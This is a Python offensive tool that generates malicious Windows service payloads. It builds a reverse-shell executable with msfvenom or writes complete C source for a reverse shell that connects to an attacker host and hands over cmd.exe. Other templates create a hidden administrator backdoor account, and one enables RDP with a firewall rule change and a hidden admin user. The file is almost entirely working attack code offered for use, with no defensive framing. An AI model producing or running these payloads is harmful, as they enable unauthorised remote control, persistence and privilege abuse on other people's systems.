import os
import subprocess
from pathlib import Path
from typing import Optional
from datetime import datetime


class PayloadGenerator:
    """Generate malicious payloads for service exploitation."""

    def __init__(self, output_dir: str = "service_exploits"):
        """
        Initialize the payload generator.

        Args:
            output_dir: Directory for storing generated payloads
        """
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(exist_ok=True)

        print(f"[+] Payload Generator initialized")
        print(f"[+] Output directory: {self.output_dir}")

    def generate_reverse_shell(self, lhost: str, lport: int,
                               output_file: str = None) -> Optional[str]:
        """
        Generate a reverse shell service executable using msfvenom.

        Args:
            lhost: Attacker IP address
            lport: Attacker listening port
            output_file: Optional output filename

        Returns:
            Path to generated payload or None on failure
        """
        print(f"\n[*] Generating reverse shell payload...")
        print(f"[*] LHOST: {lhost}")
        print(f"[*] LPORT: {lport}")

        if not output_file:
            output_file = f"reverse_shell_{lport}.exe"

        output_path = self.output_dir / output_file

        # Check if msfvenom is available
        check = subprocess.run("which msfvenom", shell=True, capture_output=True)

        if check.returncode != 0:
            print("[-] msfvenom not found. Install Metasploit Framework.")
            print("[*] Generating source code template instead...")
            return self._generate_reverse_shell_template(lhost, lport)

        cmd = (
            f'msfvenom -p windows/x64/shell_reverse_tcp '
            f'LHOST={lhost} LPORT={lport} '
            f'-f exe-service -o "{output_path}"'
        )

        print(f"[*] Executing: {cmd}")

        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)

        if output_path.exists():
            print(f"[+] Payload generated: {output_path}")
            print(f"[+] Size: {output_path.stat().st_size} bytes")
            return str(output_path)
        else:
            print(f"[-] Payload generation failed")
            print(f"[-] Error: {result.stderr}")
            return None

    def _generate_reverse_shell_template(self, lhost: str, lport: int) -> str:
        """
        Generate reverse shell source code template.

        Args:
            lhost: Attacker IP address
            lport: Attacker listening port

        Returns:
            Path to generated source file
        """
        template = f'''// Reverse Shell Service Executable
// Compile with: x86_64-w64-mingw32-gcc -o reverse_shell.exe reverse_shell.c -lws2_32

#include <winsock2.h>
#include <windows.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

#define LHOST "{lhost}"
#define LPORT {lport}

SERVICE_STATUS serviceStatus;
SERVICE_STATUS_HANDLE serviceStatusHandle;

void UpdateServiceStatus(DWORD currentState) {{
    serviceStatus.dwCurrentState = currentState;
    SetServiceStatus(serviceStatusHandle, &serviceStatus);
}}

void ReverseShell() {{
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in addr;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    WSAStartup(MAKEWORD(2, 2), &wsaData);

    sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    addr.sin_family = AF_INET;
    addr.sin_port = htons(LPORT);
    addr.sin_addr.s_addr = inet_addr(LHOST);

    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == 0) {{
        memset(&si, 0, sizeof(si));
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESTDHANDLES;
        si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;

        CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 
                     CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

        WaitForSingleObject(pi.hProcess, INFINITE);
    }}

    closesocket(sock);
    WSACleanup();
}}

void WINAPI ServiceMain(DWORD argc, LPTSTR *argv) {{
    serviceStatusHandle = RegisterServiceCtrlHandler("MalService", NULL);

    serviceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    serviceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;

    UpdateServiceStatus(SERVICE_RUNNING);

    ReverseShell();

    UpdateServiceStatus(SERVICE_STOPPED);
}}

int main() {{
    SERVICE_TABLE_ENTRY serviceTable[] = {{
        {{"MalService", (LPSERVICE_MAIN_FUNCTION)ServiceMain}},
        {{NULL, NULL}}
    }};

    StartServiceCtrlDispatcher(serviceTable);
    return 0;
}}
'''

        output_path = self.output_dir / "reverse_shell.c"

        with open(output_path, 'w') as f:
            f.write(template)

        print(f"[+] Source code saved to: {output_path}")
        print(f"[*] Compile with: x86_64-w64-mingw32-gcc -o reverse_shell.exe reverse_shell.c -lws2_32")

        return str(output_path)

    def generate_add_user(self, username: str = "hacker",
                          password: str = "Password123!",
                          hide_user: bool = True,
                          output_file: str = None) -> str:
        """
        Generate a service executable that creates an admin user.

        Args:
            username: Username to create
            password: Password for the user
            hide_user: Whether to hide user from login screen
            output_file: Optional output filename

        Returns:
            Path to generated source file
        """
        print(f"\n[*] Generating add-user payload...")
        print(f"[*] Username: {username}")
        print(f"[*] Hidden: {hide_user}")

        hide_code = ""
        if hide_user:
            hide_code = f'''
    // Hide user from login screen
    system("reg add \\"HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\\SpecialAccounts\\\\UserList\\" /v {username} /t REG_DWORD /d 0 /f");
'''

        template = f'''// Admin User Creation Service Executable
// Compile with: x86_64-w64-mingw32-gcc -o add_user.exe add_user.c

#include <windows.h>
#include <stdio.h>

SERVICE_STATUS serviceStatus;
SERVICE_STATUS_HANDLE serviceStatusHandle;

void UpdateServiceStatus(DWORD currentState) {{
    serviceStatus.dwCurrentState = currentState;
    SetServiceStatus(serviceStatusHandle, &serviceStatus);
}}

void WINAPI ServiceMain(DWORD argc, LPTSTR *argv) {{
    serviceStatusHandle = RegisterServiceCtrlHandler("MalService", NULL);

    serviceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    serviceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;

    UpdateServiceStatus(SERVICE_RUNNING);

    // Create admin user
    system("net user {username} {password} /add");
    system("net localgroup administrators {username} /add");
{hide_code}

    UpdateServiceStatus(SERVICE_STOPPED);
}}

int main() {{
    SERVICE_TABLE_ENTRY serviceTable[] = {{
        {{"MalService", (LPSERVICE_MAIN_FUNCTION)ServiceMain}},
        {{NULL, NULL}}
    }};

    StartServiceCtrlDispatcher(serviceTable);
    return 0;
}}
'''

        if not output_file:
            output_file = f"add_user_{username}.c"

        output_path = self.output_dir / output_file

        with open(output_path, 'w') as f:
            f.write(template)

        print(f"[+] Source code saved to: {output_path}")
        print(f"[*] Compile with: x86_64-w64-mingw32-gcc -o add_user.exe add_user.c")

        return str(output_path)

    def generate_enable_rdp(self, username: str = "rdpuser",
                            password: str = "RDPPass123!",
                            output_file: str = None) -> str:
        """
        Generate a service executable that enables RDP and creates a user.

        Args:
            username: Username to create
            password: Password for the user
            output_file: Optional output filename

        Returns:
            Path to generated source file
        """
        print(f"\n[*] Generating enable-RDP payload...")
        print(f"[*] Username: {username}")

        template = f'''// RDP Enable Service Executable
// Compile with: x86_64-w64-mingw32-gcc -o enable_rdp.exe enable_rdp.c

#include <windows.h>
#include <stdio.h>

SERVICE_STATUS serviceStatus;
SERVICE_STATUS_HANDLE serviceStatusHandle;

void UpdateServiceStatus(DWORD currentState) {{
    serviceStatus.dwCurrentState = currentState;
    SetServiceStatus(serviceStatusHandle, &serviceStatus);
}}

void WINAPI ServiceMain(DWORD argc, LPTSTR *argv) {{
    serviceStatusHandle = RegisterServiceCtrlHandler("MalService", NULL);

    serviceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    serviceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;

    UpdateServiceStatus(SERVICE_RUNNING);

    // Enable RDP
    system("reg add \\"HKLM\\\\System\\\\CurrentControlSet\\\\Control\\\\Terminal Server\\" /v fDenyTSConnections /t REG_DWORD /d 0 /f");

    // Allow RDP through firewall
    system("netsh advfirewall firewall set rule group=\\"remote desktop\\" new enable=yes");

    // Create RDP user
    system("net user {username} {password} /add");
    system("net localgroup administrators {username} /add");
    system("net localgroup \\"Remote Desktop Users\\" {username} /add");

    // Hide user
    system("reg add \\"HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\\SpecialAccounts\\\\UserList\\" /v {username} /t REG_DWORD /d 0 /f");

    UpdateServiceStatus(SERVICE_STOPPED);
}}

int main() {{
    SERVICE_TABLE_ENTRY serviceTable[] = {{
        {{"MalService", (LPSERVICE_MAIN_FUNCTION)ServiceMain}},
        {{NULL, NULL}}
    }};

    StartServiceCtrlDispatcher(serviceTable);
    return 0;
}}
'''

        if not output_file:
            output_file = f"enable_rdp_{username}.c"

        output_path = self.output_dir / output_file

        with open(output_path, 'w') as f:
            f.write(template)

        print(f"[+] Source code saved to: {output_path}")
        print(f"[*] Compile with: x86_64-w64-mingw32-gcc -o enable_rdp.exe enable_rdp.c")
        print(f"[*] Connect with: rdesktop -u {username} -p {password} <TARGET_IP>")

        return str(output_path)

    def list_payloads(self) -> list:
        """
        List all generated payloads in the output directory.

        Returns:
            List of payload file paths
        """
        payloads = []

        for ext in ['*.exe', '*.c']:
            payloads.extend(self.output_dir.glob(ext))

        return [str(p) for p in payloads]


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="Payload Generator")
    parser.add_argument('--type', choices=['reverse_shell', 'add_user', 'enable_rdp'],
                        required=True, help='Payload type to generate')
    parser.add_argument('--lhost', help='LHOST for reverse shell')
    parser.add_argument('--lport', type=int, help='LPORT for reverse shell')
    parser.add_argument('--username', default='hacker', help='Username for add_user/enable_rdp')
    parser.add_argument('--password', default='Password123!', help='Password for new user')
    parser.add_argument('--output', help='Output file path')

    args = parser.parse_args()

    generator = PayloadGenerator()

    if args.type == 'reverse_shell':
        if not args.lhost or not args.lport:
            print("[-] --lhost and --lport required for reverse_shell")
        else:
            generator.generate_reverse_shell(args.lhost, args.lport, args.output)

    elif args.type == 'add_user':
        generator.generate_add_user(args.username, args.password, output_file=args.output)

    elif args.type == 'enable_rdp':
        generator.generate_enable_rdp(args.username, args.password, args.output)